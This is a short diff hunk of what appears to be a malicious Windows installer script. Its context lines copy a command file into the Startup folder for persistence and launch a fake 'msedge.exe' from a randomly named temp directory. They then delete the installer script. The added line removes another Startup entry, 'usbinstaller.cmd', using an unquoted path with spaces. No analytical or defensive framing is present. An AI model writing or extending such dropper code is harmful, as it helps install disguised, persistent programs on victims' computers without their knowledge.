@@ -25,5 +25,6 @@ Move-Item "startup.cmd" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Star
 Start-Process $env:temp/sVBXKuz/msedge.exe
 
 powershell.exe /c Remove-Item $env:temp/nadmin_dinstall.ps1
+powershell.exe /c Remove-Item $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\usbinstaller.cmd
 
 exit
